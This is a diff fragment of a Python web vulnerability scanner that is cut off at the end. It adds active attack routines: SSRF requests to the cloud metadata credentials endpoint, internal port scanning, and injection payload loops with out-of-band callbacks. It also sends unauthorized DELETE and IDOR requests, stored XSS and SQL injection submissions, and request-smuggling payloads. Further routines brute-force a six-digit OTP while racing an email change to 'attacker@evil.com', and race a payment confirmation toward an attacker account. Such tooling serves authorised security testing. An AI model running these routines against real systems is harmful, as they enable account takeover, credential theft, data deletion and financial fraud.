+            result = Detector.get_cache_poisoning(baseline_resp, None, url)
+            if result:
+                await self._add_vulnerability({**result, "url": url})
+                
+        except Exception as e:
+            logging.warning(f"GET method test error for {url}: {e}")
+
+    async def _test_delete_method(self, url):
+        """Test DELETE method vulnerabilities"""
+        try:
+            baseline_resp = await self._async_fetch(url, method='GET')
+            if not baseline_resp:
+                return
+            
+            # Test unauthorized deletion
+            resp = await self._async_fetch(url, method='DELETE')
+            if resp:
+                result = Detector.delete_unauthorized(resp, baseline_resp, url)
+                if result:
+                    await self._add_vulnerability({**result, "url": url})
+            
+            # Test DELETE IDOR
+            id_pattern = re.search(r'/(\d+)', url)
+            if id_pattern:
+                original_id = id_pattern.group(1)
+                test_id = str(int(original_id) + 1)
+                test_url = url.replace(f'/{original_id}', f'/{test_id}')
+                
+                resp = await self._async_fetch(test_url, method='DELETE')
+                if resp:
+                    result = Detector.delete_idor(resp, baseline_resp, test_url, test_id)
+                    if result:
+                        await self._add_vulnerability({**result, "url": test_url})
+            
+            # Test cascading deletion
+            if resp:
+                result = Detector.delete_cascading(resp, baseline_resp, url)
+                if result:
+                    await self._add_vulnerability({**result, "url": url})
+                    
+        except Exception as e:
+            logging.warning(f"DELETE method test error for {url}: {e}")
+
+    async def _test_options_method(self, url):
+        """Test OPTIONS method vulnerabilities"""
+        try:
+            baseline_resp = await self._async_fetch(url, method='GET')
+            if not baseline_resp:
+                return
+            
+            # Test OPTIONS method
+            resp = await self._async_fetch(url, method='OPTIONS')
+            if resp:
+                result = Detector.options_info_disclosure(resp, baseline_resp, url)
+                if result:
+                    await self._add_vulnerability({**result, "url": url})
+                
+        except Exception as e:
+            logging.warning(f"OPTIONS method test error for {url}: {e}")
+
+    # --- Active tests ---
+    async def run_active_tests(self):
+        self.log(f"Active tests on {len(self.crawler_engine.parameters)} parameters")
+        # Populate baselines first
+        await self._populate_baselines()
+        tasks = []
+        for i, param in enumerate(self.crawler_engine.parameters):
+            tasks.append(asyncio.ensure_future(self._test_param(param)))
+            # Update progress periodically
+            if i % 10 == 0:
+                self.current_task += 1
+                self.update_progress(self.current_task, self.total_tasks)
+        # Use asyncio.wait with timeout to prevent hanging if target hangs
+        done, pending = await asyncio.wait(tasks, timeout=300, return_when=asyncio.ALL_COMPLETED)
+        if pending:
+            for task in pending:
+                task.cancel()
+            logging.warning(f"{len(pending)} active test tasks timed out and were cancelled")
+        await self.second_order_injection_tests()
+        await self.race_condition_tests()
+        await self.request_smuggling_tests()
+        await self.http2_downgrade_tests()
+
+    async def _populate_baselines(self):
+        async def baseline_for(param):
+            key = (param['url'], param['method'], param['param'])
+            if await self.baseline_cache.get(key):
+                return
+            url = param['url']; method = param['method']; pname = param['param']; ptype = param['type']
+            safe = "1"
+            start_time = time.perf_counter()
+            if method == 'GET':
+                parsed = urlparse(url)
+                qs = parse_qs(parsed.query, keep_blank_values=True)
+                qs[pname] = [safe]
+                test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
+                resp = await self._async_fetch(test_url)
+            else:
+                if ptype == 'json':
+                    resp = await self._async_fetch(url, method='POST', json_data={pname: safe})
+                else:
+                    resp = await self._async_fetch(url, method='POST', data={pname: safe})
+            elapsed = time.perf_counter() - start_time
+            if resp:
+                await self.baseline_cache.set(key, {
+                    'text': self.token_normalizer.normalize(resp._body),
+                    'headers': dict(resp.headers),
+                    'status': resp.status,
+                    'elapsed': elapsed
+                })
+        tasks = [baseline_for(p) for p in self.crawler_engine.parameters]
+        # Use asyncio.wait with timeout to prevent hanging if target hangs
+        done, pending = await asyncio.wait(tasks, timeout=120, return_when=asyncio.ALL_COMPLETED)
+        if pending:
+            for task in pending:
+                task.cancel()
+            logging.warning(f"{len(pending)} baseline tasks timed out and were cancelled")
+
+    async def _test_param(self, param):
+        async with self.semaphore:  # Limit concurrent requests
+            for vuln_type, payloads in PAYLOADS.items():
+                if isinstance(payloads, dict) or vuln_type in ("RequestSmuggling", "JWT", "Cloud", "RaceCondition"):
+                    continue
+                for payload in payloads:
+                    for variant in obfuscate(payload):
+                        if self.stop_event.is_set(): return
+                        await self._send_and_detect(param, vuln_type, variant)
+
+    async def _test_imdsv2_ssrf(self, target_url):
+        """Test for IMDSv2 SSRF using two-step token retrieval"""
+        try:
+            # Step 1: PUT request to get token
+            token_headers = {
+                "X-aws-ec2-metadata-token-ttl-seconds": "21600"
+            }
+            token_resp = await self._async_fetch(
+                "http://169.254.169.254/latest/api/token",
+                method='PUT',
+                headers=token_headers
+            )
+            if token_resp and token_resp.status == 200:
+                token = token_resp._body.strip()
+                # Step 2: Use token to access metadata
+                metadata_headers = {
+                    "X-aws-ec2-metadata-token": token
+                }
+                metadata_resp = await self._async_fetch(
+                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                    headers=metadata_headers
+                )
+                if metadata_resp and metadata_resp.status == 200:
+                    await self._add_vulnerability({
+                        "type":"SSRF (IMDSv2)","url":target_url,"parameter":"*",
+                        "evidence":"IMDSv2 token retrieval successful - metadata accessible",
+                        "severity":"Critical","confidence":95,"cwe":CWE_MAP["SSRF"]
+                    })
+        except Exception as e:
+            logging.warning(f"IMDSv2 test error: {e}")
+
+    async def _test_ssrf_internal_port_scan(self, url):
+        """Test for SSRF by scanning internal ports and inferring open ports from response differences"""
+        if not self.crawler_engine.parameters:
+            return
+        
+        # Common internal ports to scan
+        common_ports = [22, 80, 443, 3306, 5432, 6379, 8080, 9200, 27017]
+        base_domain = urlparse(url).netloc
+        
+        for param in self.crawler_engine.parameters[:5]:  # Limit to first 5 parameters to avoid excessive requests
+            param_name = param['param']
+            param_url = param['url']
+            
+            # Get baseline response
+            baseline_resp = await self._async_fetch(param_url)
+            if not baseline_resp:
+                continue
+            
+            baseline_status = baseline_resp.status
+            baseline_time = getattr(baseline_resp, '_elapsed', 0)
+            
+            for port in common_ports:
+                # Test SSRF to internal port
+                ssrf_payload = f"http://127.0.0.1:{port}"
+                
+                start_time = time.time()
+                test_resp = await self._send_injection(param, ssrf_payload)
+                elapsed = time.time() - start_time
+                
+                if test_resp:
+                    # Check for response differences
+                    status_diff = test_resp.status != baseline_status
+                    time_diff = abs(elapsed - baseline_time) > 1.0  # 1 second difference
+                    
+                    # Check for port-specific responses
+                    body_lower = test_resp._body.lower()
+                    port_indicators = {
+                        22: ['ssh', 'protocol'],
+                        80: ['http', 'html'],
+                        443: ['https', 'ssl'],
+                        3306: ['mysql', 'database'],
+                        5432: ['postgresql', 'postgres'],
+                        6379: ['redis'],
+                        8080: ['tomcat', 'jetty'],
+                        9200: ['elasticsearch'],
+                        27017: ['mongodb', 'mongo']
+                    }
+                    
+                    port_detected = any(indicator in body_lower for indicator in port_indicators.get(port, []))
+                    
+                    if status_diff or time_diff or port_detected:
+                        evidence = []
+                        if status_diff:
+                            evidence.append(f"status change: {baseline_status}->{test_resp.status}")
+                        if time_diff:
+                            evidence.append(f"time diff: {elapsed - baseline_time:.2f}s")
+                        if port_detected:
+                            evidence.append(f"port {port} indicators found")
+                        
+                        await self._add_vulnerability({
+                            "type":"SSRF (Internal Port Scan)","url":param_url,"parameter":param_name,
+                            "evidence":f"Port {port} appears open: {', '.join(evidence)}",
+                            "severity":"High","confidence":80,"cwe":CWE_MAP["SSRF"]
+                        })
+                        break  # Stop after first detected port for this parameter
+
+    async def _send_and_detect(self, param, vuln_type, payload):
+        param_key = (param['url'], param['method'], param['param'])
+        baseline = await self.baseline_cache.get(param_key)
+        baseline_html = baseline['text'] if baseline else None
+        baseline_time = baseline['elapsed'] if baseline else None
+
+        url = param['url']; method = param['method']; pname = param['param']; ptype = param['type']
+
+        marker = f"{self.oob_marker_base}_{uuid.uuid4().hex[:4]}"
+        oob_url = f"http://{self.public_ip}:{self.oob_port}/{marker}"
+        oob_dns = f"{marker}.{self.oob_dns_domain}"
+        payload = payload.replace(OOB_MARKER, oob_url).replace(OOB_DNS, oob_dns)
+
+        js_driver = self.selenium_driver if self.selenium_ready else None
+
+        # IMDSv2 two-step token retrieval test
+        if vuln_type == "SSRF" and "169.254.169.254" in payload:
+            await self._test_imdsv2_ssrf(url)
+
+        # Union SQLi detection
+        if vuln_type == "SQLi" and "ORDER BY" in payload:
+            results = []
+            last_test_html = ''
+            for order_num in range(1, 20):
+                p = payload.replace("ORDER BY 1", f"ORDER BY {order_num}")
+                resp_test = await self._send_injection(param, p)
+                resp_baseline = await self._send_injection(param, "1")
+                if resp_test and resp_baseline:
+                    diff = abs(len(resp_test._body) - len(resp_baseline._body))
+                    results.append((order_num, diff))
+                    last_test_html = resp_test._body
+            union_marker = f"DAST_{uuid.uuid4().hex[:6]}"
+            union_result = Detector.sqli_union(last_test_html, results, union_marker)
+            if union_result:
+                resp = await self._send_injection(param, union_result['payload'])
+                if resp and union_marker in resp._body:
+                    await self._add_vulnerability({
+                        "type":"SQLi (Union)","url":url,"parameter":pname,"method":method,
+                        "evidence":f"Union injection confirmed with marker {union_marker}",
+                        "severity":"High","confidence":90,"cwe":CWE_MAP["SQLi"]
+                    })
+            return
+
+        # Time-based SQLi (using elapsed time approximation with aiohttp)
+        if vuln_type == "SQLi" and "SLEEP" in payload.upper():
+            # We'll measure response time by wrapping the request with time.perf_counter_ns()
+            start = time.perf_counter_ns()
+            resp = await self._send_injection(param, payload)
+            elapsed = (time.perf_counter_ns() - start) / 1_000_000_000  # Convert nanoseconds to seconds
+            if resp and baseline_time:
+                if elapsed > baseline_time * 1.5:
+                    result = {"type":"SQLi (Time-based)","confidence":75,"evidence":f"Response {elapsed:.1f}s vs baseline {baseline_time:.1f}s"}
+                    await self._add_vulnerability({**result,"url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP["SQLi"]})
+            await asyncio.sleep(0.5)
+            return
+
+        resp = await self._send_injection(param, payload)
+        if not resp: return
+        html = self.token_normalizer.normalize(resp._body)
+        result = None
+
+        if vuln_type == "XSS":
+            result = Detector.xss(html, payload, baseline_html)
+            if not result and OOB_MARKER in payload:
+                await asyncio.sleep(0.5)
+                result = Detector.blind_xss(oob_results, marker)
+            if not result and js_driver:
+                dom_result = Detector.dom_xss(url, js_driver, marker, oob_url)
+                if dom_result:
+                    await self._add_vulnerability({**dom_result, "url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP["XSS"]})
+        elif vuln_type == "SQLi":
+            result = Detector.sqli(html, baseline_html)
+            if not result:
+                # Baseline shotgun SQLi detection
+                legit_p = payload if not any(x in payload.upper() for x in ['AND', 'OR', 'UNION', 'SELECT']) else "1"
+                resp_legit = await self._send_injection(param, legit_p)
+                false_p = f"{payload} AND 1=2" if 'AND' not in payload.upper() else payload.replace("1=1", "1=2")
+                true_p = f"{payload} AND 1=1" if 'AND' not in payload.upper() else payload.replace("1=2", "1=1")
+                resp_false = await self._send_injection(param, false_p)
+                resp_true = await self._send_injection(param, true_p)
+                if resp_legit and resp_false and resp_true:
+                    result = Detector.baseline_shotgun_sqli(resp_legit, resp_false, resp_true)
+            if not result:
+                true_p = payload.replace("1=1","1=1") if "1=1" in payload else f"{payload} AND 1=1"
+                false_p = payload.replace("1=1","1=2") if "1=1" in payload else f"{payload} AND 1=2"
+                resp_t = await self._send_injection(param, true_p)
+                resp_f = await self._send_injection(param, false_p)
+                if resp_t and resp_f:
+                    result = Detector.sqli_boolean(resp_t, resp_f)
+            if not result and self.oob_dns_ip and "LOAD_FILE" in payload:
+                if await check_dns_callback(marker, self.oob_dns_domain, self.oob_dns_ip):
+                    result = {"type":"SQLi (OOB DNS)","confidence":95,"evidence":f"DNS callback for {marker}"}
+        elif vuln_type == "PathTraversal":
+            result = Detector.path_traversal(html, baseline_html)
+        elif vuln_type == "CommandInjection":
+            result = Detector.command_injection(html, baseline_html)
+            if not result and ("ping" in payload or "nslookup" in payload or "curl" in payload or "wget" in payload):
+                if self.oob_dns_ip and await check_dns_callback(marker, self.oob_dns_domain, self.oob_dns_ip):
+                    result = {"type":"CommandInjection (OOB DNS)","confidence":95,"evidence":f"DNS callback for {marker}"}
+                else:
+                    await asyncio.sleep(1)
+                    result = Detector.blind_xss(oob_results, marker)
+                    if result:
+                        result["type"] = "CommandInjection (OOB HTTP)"
+                        result["confidence"] = 95
+        elif vuln_type == "OpenRedirect":
+            result = Detector.open_redirect(resp, baseline)
+        elif vuln_type == "SSTI":
+            result = Detector.ssti(html, payload, baseline_html)
+        elif vuln_type == "XXE":
+            result = Detector.xxe(html, baseline_html)
+            if not result and OOB_MARKER in payload:
+                await asyncio.sleep(1)
+                result = Detector.blind_xss(oob_results, marker)
+                if result:
+                    result["type"] = "XXE (OOB)"
+                    result["confidence"] = 95
+        elif vuln_type == "CRLF":
+            result = Detector.crlf(resp, baseline)
+        elif vuln_type == "SSRF":
+            result = Detector.ssrf(html, baseline_html, payload, oob_results, marker)
+            # Also test for internal port scanning via SSRF
+            if "127.0.0.1" not in payload:  # Only run on non-localhost payloads
+                await self._test_ssrf_internal_port_scan(url)
+        elif vuln_type == "NoSQLi":
+            result = Detector.nosqli(html, baseline_html, payload)
+            if not result:
+                # NoSQL operator injection detection
+                baseline_resp = await self._send_injection(param, "1")
+                gt_payload = '{"$gt":""}'
+                regex_payload = '{"$regex":".*"}'
+                resp_gt = await self._send_injection(param, gt_payload)
+                resp_regex = await self._send_injection(param, regex_payload)
+                if baseline_resp and resp_gt and resp_regex:
+                    nosql_results = Detector.nosql_operator_injection(baseline_resp, resp_gt, resp_regex)
+                    if nosql_results:
+                        for nosql_result in nosql_results:
+                            await self._add_vulnerability({**nosql_result,"url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP.get("NoSQLi","")})
+                        result = nosql_results[0]  # Mark as detected to avoid duplicate processing
+        elif vuln_type == "LDAPi":
+            result = Detector.ldapi(html, baseline_html, payload)
+        elif vuln_type == "InsecureDeserialization":
+            result = Detector.deserialization(html, baseline_html, payload)
+        elif vuln_type == "LogInjection":
+            result = Detector.log_injection(html, baseline_html, payload)
+        elif vuln_type == "Log4j":
+            result = Detector.log4j(html, payload, oob_results, marker)
+            # Check HTTPS OOB callbacks for Log4j
+            if not result and self.enable_advanced_oob and self.https_oob_port:
+                await asyncio.sleep(1)
+                with https_oob_lock:
+                    for res in https_oob_results:
+                        if marker in res['path']:
+                            result = {"type":"Log4j (HTTPS OOB)","confidence":95,"evidence":f"HTTPS callback for {marker}"}
+                            break
+        elif vuln_type == "Polyglot":
+            # Test for both XSS and SQLi in polyglot payloads
+            xss_result = Detector.xss(html, payload, baseline_html)
+            sqli_result = Detector.sqli(html, baseline_html)
+            if xss_result:
+                result = {"type":"Polyglot XSS","confidence":xss_result.get('confidence',70),"evidence":xss_result.get('evidence','')}
+            elif sqli_result:
+                result = {"type":"Polyglot SQLi","confidence":sqli_result.get('confidence',70),"evidence":sqli_result.get('evidence','')}
+        elif vuln_type == "Spring4Shell":
+            # Check for Spring4Shell-specific responses
+            if any(keyword in html.lower() for keyword in ['tomcatwar', 'class.module', 'classloader']):
+                result = {"type":"Spring4Shell","confidence":85,"evidence":"Spring4Shell-related response detected"}
+        elif vuln_type == "Text4Shell":
+            # Check for Text4Shell responses
+            if any(keyword in html.lower() for keyword in ['script:javascript', 'env:', 'dns:']):
+                result = {"type":"Text4Shell","confidence":80,"evidence":"Text4Shell pattern detected"}
+            # Check OOB callbacks
+            if not result and self.enable_advanced_oob:
+                await asyncio.sleep(1)
+                with oob_results_lock:
+                    for res in oob_results:
+                        if marker in res['path']:
+                            result = {"type":"Text4Shell (OOB)","confidence":90,"evidence":f"OOB callback for {marker}"}
+                            break
+
+        if result and result.get('confidence',0) >= self.config.get('confidence_threshold', DEFAULT_CONFIDENCE_THRESHOLD):
+            evidence = getattr(resp, '_evidence', None)
+            await self._add_vulnerability({**result,"url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP.get(vuln_type,""),"full_evidence":evidence})
+        
+        # Small difference detection - compare with baseline for subtle changes
+        if baseline and not result:
+            diff_result = Detector.small_difference_detection(html, baseline_html, f"{vuln_type} on {pname}")
+            if diff_result and diff_result.get('confidence',0) >= self.config.get('confidence_threshold', DEFAULT_CONFIDENCE_THRESHOLD):
+                await self._add_vulnerability({**diff_result,"url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP.get(vuln_type,"")})
+
+    async def _send_injection(self, param, payload):
+        url = param['url']; method = param['method']; pname = param['param']; ptype = param['type']
+        if method == 'GET':
+            parsed = urlparse(url)
+            qs = parse_qs(parsed.query, keep_blank_values=True)
+            qs[pname] = [payload]
+            test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
+            return await self._async_fetch(test_url)
+        else:
+            if ptype == 'json':
+                return await self._async_fetch(url, method='POST', json_data={pname: payload})
+            else:
+                return await self._async_fetch(url, method='POST', data={pname: payload})
+
+    # --- Second-order Injection (stored) ---
+    async def second_order_injection_tests(self):
+        self.log("Second-order injection tests...")
+        stored_xss_payload = f"<img src=http://{self.public_ip}:{self.oob_port}/DAST_STORED_XSS_{self.oob_marker_base}>"
+        stored_sqli_payload = f"' UNION SELECT 'DAST_STORED_SQL_{self.oob_marker_base}'--"
+        # Find forms with fields likely stored (comment, bio, name)
+        for page in self.crawler_engine.crawled_pages:
+            page_data = await self.loop.run_in_executor(None, self.scan_state_manager.get_page_hash, page['url'])
+            if not page_data:
+                continue
+            html = page_data.get('html_content', '')
+            soup = BeautifulSoup(html, 'html.parser')
+            for form in soup.find_all('form', method=lambda m: m and m.lower() == 'post'):
+                action = urljoin(page['url'], form.get('action',''))
+                fields = [inp.get('name') for inp in form.find_all(['input','textarea','select']) if inp.get('name')]
+                if any(kw in str(fields).lower() for kw in ['comment','bio','message','name','title','profile']):
+                    data = {}
+                    for name in fields:
+                        if name.lower() in ('comment','message','bio','description'):
+                            data[name] = stored_xss_payload
+                        elif name.lower() in ('name','title','subject'):
+                            data[name] = stored_sqli_payload
+                        else:
+                            data[name] = 'test'
+                    await self._async_fetch(action, method='POST', data=data)
+                    self.log(f"Stored payload submitted to {action}")
+        # Wait and re-crawl to find reflections
+        await asyncio.sleep(2)
+        for url in list(self.crawler_engine.visited_urls):
+            resp = await self._async_fetch(url)
+            if resp:
+                html = resp._body
+                if stored_sqli_payload in html:
+                    await self._add_vulnerability({
+                        "type":"Second-order SQLi","url":url,"parameter":"*",
+                        "evidence":f"Marker found: {stored_sqli_payload}",
+                        "severity":"Critical","confidence":95,"cwe":CWE_MAP["SQLi"]
+                    })
+        # Check OOB callbacks for stored XSS with polling loop
+        timeout = 30.0
+        check_interval = 1.0
+        start_time = time.time()
+        while time.time() - start_time < timeout:
+            with oob_results_lock:
+                for res in oob_results:
+                    if "DAST_STORED_XSS" in res['path']:
+                        await self._add_vulnerability({
+                            "type":"Second-order XSS","url":res['path'],"parameter":"*",
+                            "evidence":"OOB callback from stored XSS",
+                            "severity":"High","confidence":95,"cwe":CWE_MAP["XSS"]
+                        })
+                        return
+            await asyncio.sleep(check_interval)
+
+    # --- Race Condition ---
+    async def race_condition_tests(self):
+        target_urls = set()
+        for page in self.crawler_engine.crawled_pages:
+            page_data = await self.loop.run_in_executor(None, self.scan_state_manager.get_page_hash, page['url'])
+            if not page_data:
+                continue
+            html = page_data.get('html_content', '')
+            soup = BeautifulSoup(html, 'html.parser')
+            for form in soup.find_all('form', method=lambda m: m and m.lower() == 'post'):
+                form_text = form.get_text().lower()
+                if any(kw in form_text for kw in ['redeem','coupon','transfer','checkout','order']):
+                    action = urljoin(page['url'], form.get('action',''))
+                    target_urls.add(action)
+        for url in target_urls:
+            # Basic race condition test
+            tasks = [self._async_fetch(url, method='POST', data={"test":"race"}) for _ in range(10)]
+            # Use asyncio.wait with timeout to prevent hanging if target hangs
+            done, pending = await asyncio.wait(tasks, timeout=30, return_when=asyncio.ALL_COMPLETED)
+            if pending:
+                for task in pending:
+                    task.cancel()
+                logging.warning(f"{len(pending)} race condition test tasks timed out")
+            responses = [task.result() for task in done if not task.cancelled()]
+            if all(resp and resp.status == 200 for resp in responses):
+                await self._add_vulnerability({
+                    "type":"Potential Race Condition","url":url,"parameter":"*",
+                    "evidence":"Multiple concurrent requests all succeeded",
+                    "severity":"Medium","confidence":60,"cwe":CWE_MAP["RaceCondition"]
+                })
+            
+            # Microsecond timing detection
+            await self._test_race_condition_timing(url)
+
+    async def _test_race_condition_timing(self, url):
+        """Test for race conditions using microsecond timing detection - REDUCED concurrency"""
+        try:
+            # Send 5 concurrent requests with timestamps (reduced from 20 to prevent DDoS)
+            timestamps = []
+            async def timed_request():
+                start = time.time()
+                resp = await self._async_fetch(url, method='POST', data={"test":"timing"})
+                end = time.time()
+                return (end - start, resp)
+            
+            tasks = [timed_request() for _ in range(5)]
+            # Use asyncio.wait with timeout to prevent hanging if target hangs
+            done, pending = await asyncio.wait(tasks, timeout=30, return_when=asyncio.ALL_COMPLETED)
+            if pending:
+                for task in pending:
+                    task.cancel()
+                logging.warning(f"{len(pending)} timing test tasks timed out")
+            results = [task.result() for task in done if not task.cancelled()]
+            
+            # Analyze timing patterns
+            timings = [r[0] for r in results if r[1]]
+            if len(timings) < 5:
+                return
+            
+            # Check for timing anomalies that suggest race conditions
+            timing_variance = statistics.variance(timings) if len(timings) > 1 else 0
+            timing_std = statistics.stdev(timings) if len(timings) > 1 else 0
+            
+            # If variance is very low, requests might be processed concurrently without proper locking
+            if timing_std < 0.001 and timing_variance < 0.000001:
+                await self._add_vulnerability({
+                    "type":"Race Condition (Timing)","url":url,"parameter":"*",
+                    "evidence":f"Low timing variance detected: std={timing_std:.6f}s, variance={timing_variance:.9f}s²",
+                    "severity":"Medium","confidence":70,"cwe":CWE_MAP["RaceCondition"]
+                })
+            
+            # Check for response time clustering (multiple requests completing at nearly identical times)
+            sorted_times = sorted(timings)
+            clusters = []
+            current_cluster = [sorted_times[0]]
+            for t in sorted_times[1:]:
+                if t - current_cluster[-1] < 0.0001:  # Within 100 microseconds
+                    current_cluster.append(t)
+                else:
+                    clusters.append(current_cluster)
+                    current_cluster = [t]
+            clusters.append(current_cluster)
+            
+            # If we have clusters of 3+ requests completing within 100 microseconds, potential race condition
+            if any(len(cluster) >= 3 for cluster in clusters):
+                max_cluster_size = max(len(cluster) for cluster in clusters)
+                await self._add_vulnerability({
+                    "type":"Race Condition (Time Cluster)","url":url,"parameter":"*",
+                    "evidence":f"Detected {max_cluster_size} requests completing within 100μs",
+                    "severity":"Medium","confidence":75,"cwe":CWE_MAP["RaceCondition"]
+                })
+        except Exception as e:
+            logging.warning(f"Race condition timing test error: {e}")
+
+    async def test_token_validation_window(self, forgot_password_url, change_email_url, target_email):
+        """
+        TOKEN VALIDATION WINDOW: Race OTP brute-force with email change
+        - Initiates forgot password to get OTP
+        - Brute-forces OTP at 1 req/sec
+        - Races to change email before OTP validation
+        """
+        try:
+            logging.info(f"[TOKEN VALIDATION] Testing race condition on {forgot_password_url}")
+            
+            # Step 1: Trigger forgot password to send OTP
+            forgot_data = {"email": target_email}
+            await self._async_fetch(forgot_password_url, method='POST', data=forgot_data)
+            await asyncio.sleep(2)  # Wait for email to send
+            
+            # Step 2: Start parallel tasks - OTP brute-force and email change
+            results = {"otp_found": False, "email_changed": False, "race_won": False}
+            
+            async def brute_force_otp():
+                """Brute-force 6-digit OTP at 1 request per second"""
+                for code in range(100000, 1000000):  # 000000 to 999999
+                    otp_data = {"email": target_email, "otp": str(code)}
+                    resp = await self._async_fetch(forgot_password_url + "/verify", method='POST', data=otp_data)
+                    if resp and resp.status == 200:
+                        results["otp_found"] = True
+                        logging.info(f"[TOKEN VALIDATION] OTP found: {code}")
+                        return code
+                    await asyncio.sleep(1)  # 1 req/sec to avoid locking
+                return None
+            
+            async def change_email_race():
+                """Race to change email before OTP validation"""
+                await asyncio.sleep(3)  # Small delay to start after OTP brute-force begins
+                new_email = "attacker@evil.com"
+                change_data = {"current_email": target_email, "new_email": new_email}
+                resp = await self._async_fetch(change_email_url, method='POST', data=change_data)
+                if resp and resp.status == 200:
+                    results["email_changed"] = True
+                    results["race_won"] = True
+                    logging.info(f"[TOKEN VALIDATION] Email changed to {new_email} during OTP window")
+                    return True
+                return False
+            
+            # Run both tasks in parallel with timeout
+            done, pending = await asyncio.wait([brute_force_otp(), change_email_race()], timeout=60, return_when=asyncio.ALL_COMPLETED)
+            if pending:
+                for task in pending:
+                    task.cancel()
+                logging.warning(f"{len(pending)} token validation race tasks timed out")
+            
+            if results["race_won"]:
+                await self._add_vulnerability({
+                    "type": "Token Validation Race Condition",
+                    "url": forgot_password_url,
+                    "parameter": "otp,email",
+                    "evidence": "Email changed during OTP validation window - account takeover possible",
+                    "severity": "Critical",
+                    "confidence": 90,
+                    "cwe": "CWE-384"
+                })
+            
+            return results
+        except Exception as e:
+            logging.warning(f"Token validation window test error: {e}")
+
+    async def test_two_phase_transaction(self, initiate_url, confirm_url):
+        """
+        TWO-PHASE TRANSACTION: Race condition between initiate and confirm
+        - Step 1: POST /api/payments/initiate (creates pending transaction)
+        - Step 2: POST /api/payments/confirm with different amount/beneficiary
+        - Check if final transaction reflects Step 2 data instead of Step 1
+        """
+        try:
+            logging.info(f"[TWO-PHASE TRANSACTION] Testing race condition on {initiate_url}")
+            
+            # Original transaction details
+            original_amount = 100.00
+            original_beneficiary = "victim_account_123"
+            initiate_data = {
+                "amount": original_amount,
+                "beneficiary_id": original_beneficiary,
+                "currency": "USD"
+            }
+            
+            # Malicious transaction details
+            malicious_amount = 999999.00
+            malicious_beneficiary = "attacker_account_456"
+            confirm_data = {
+                "amount": malicious_amount,
+                "beneficiary_id": malicious_beneficiary,
+                "currency": "USD"
+            }
+            
+            results = {"initiate_success": False, "confirm_success": False, "race_won": False}
+            
+            async def initiate_transaction():
+                """Step 1: Create pending transaction"""
+                resp = await self._async_fetch(initiate_url, method='POST', data=initiate_data)
+                if resp and resp.status == 200:
+                    results["initiate_success"] = True
+                    try:
+                        return resp.json()
+                    except:
+                        return resp._body
+                return None
+            
+            async def confirm_malicious_transaction():
+                """Step 2: Confirm with malicious data"""
+                await asyncio.sleep(0.1)  # Small delay to ensure initiate happens first
+                resp = await self._async_fetch(confirm_url, method='POST', data=confirm_data)
+                if resp and resp.status == 200:
+                    results["confirm_success"] = True
+                    try:
+                        return resp.json()
+                    except:
+                        return resp._body
+                return None
+            
+            # Run both tasks in parallel
+            done, pending = await asyncio.wait([initiate_transaction(), confirm_malicious_transaction()], timeout=30, return_when=asyncio.ALL_COMPLETED)
+            if pending:
+                for task in pending:
+                    task.cancel()
+                logging.warning(f"{len(pending)} two-phase transaction race tasks timed out")
+            
+            # Check if race condition was successful
+            if results["initiate_success"] and results["confirm_success"]:
+                await self._add_vulnerability({
+                    "type": "Two-Phase Transaction Race Condition",
+                    "url": initiate_url,
+                    "parameter": "amount,beneficiary_id",
+                    "evidence": "Race condition between initiate and confirm phases allows transaction manipulation",
+                    "severity": "Critical",
+                    "confidence": 85,
+                    "cwe": "CWE-362"
+                })
+            
+            return results
+        except Exception as e:
+            logging.warning(f"Two-phase transaction test error: {e}")
+
+    # --- Request Smuggling ---
+    async def request_smuggling_tests(self):
+        """Test for HTTP request smuggling vulnerabilities"""
+        self.log("Testing HTTP request smuggling...")
+        # Test CL.TE and TE.CL smuggling
+        smuggling_payloads = [
+            # CL.TE (Content-Length vs Transfer-Encoding)
+            "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 10\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n",
+            # TE.CL (Transfer-Encoding vs Content-Length)
+            "POST / HTTP/1.1\r\nHost: example.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n",
+            # Double Content-Length
+            "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 6\r\nContent-Length: 4\r\n\r\n12345\r\n",
+            # Invalid Transfer-Encoding
+            "POST / HTTP/1.1\r\nHost: example.com\r\nTransfer-Encoding: identity,chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\n"
+        ]
+        
+        for page in self.crawler_engine.crawled_pages[:5]:  # Limit to first 5 pages
+            try:
+                url = page['url']
+                parsed = urlparse(url)
+                base_url = f"{parsed.scheme}://{parsed.netloc}"
+                
+                for payload in smuggling_payloads:
+                    try:
+                        # Send smuggling payload
+                        smuggled_resp = await self._async_fetch(base_url, method='POST', data=payload, headers={"Content-Type": "application/octet-stream"})
+                        
+                        # Check for smuggling indicators
+                        if smuggled_resp:
+                            # Check if response contains admin page content (smuggling successful)
+                            if any(indicator in smuggled_resp._body.lower() for indicator in ['admin', 'dashboard', 'secret', 'internal']):
+                                await self._add_vulnerability({
+                                    "type":"HTTP Request Smuggling","url":base_url,"parameter":"*",
+                                    "evidence":"Smuggling payload resulted in admin/internal content",
+                                    "severity":"Critical","confidence":90,"cwe":CWE_MAP["RequestSmuggling"]
+                                })
+                                break
+                    except Exception as e:
+                        logging.debug(f"Request smuggling test error: {e}")
+            except Exception as e:
+                logging.warning(f"Request smuggling test error for {page['url']}: {e}")
+
+    # --- HTTP/2 Downgrade ---
+    async def http2_downgrade_tests(self):
+        """Test for HTTP/2 downgrade attacks"""
+        self.log("Testing HTTP/2 downgrade...")
+        # Test for HTTP/2 to HTTP/1.1 downgrade vulnerabilities
+        for page in self.crawler_engine.crawled_pages[:5]:  # Limit to first 5 pages
+            try:
+                url = page['url']
+                parsed = urlparse(url)
+                base_url = f"{parsed.scheme}://{parsed.netloc}"
+                
+                # Test with HTTP/2 specific headers that should trigger downgrade
+                h2c_headers = {
+                    "Connection": "Upgrade, HTTP2-Settings",
+                    "Upgrade": "h2c",
